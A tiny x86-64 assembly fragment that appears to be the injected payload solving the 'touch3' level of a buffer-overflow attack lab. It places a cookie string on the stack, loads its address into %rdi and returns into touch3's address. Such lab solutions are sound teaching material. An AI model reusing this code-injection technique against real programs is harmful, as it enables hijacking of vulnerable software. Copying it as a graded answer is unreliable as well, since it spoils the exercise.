.asciz "47db4e3a"
movq $0x55652778, %rdi # 0x55652778 is %rsp of "Gets" function, using gdb to find the string address
pushq $0x401948	# touch3 address
ret 

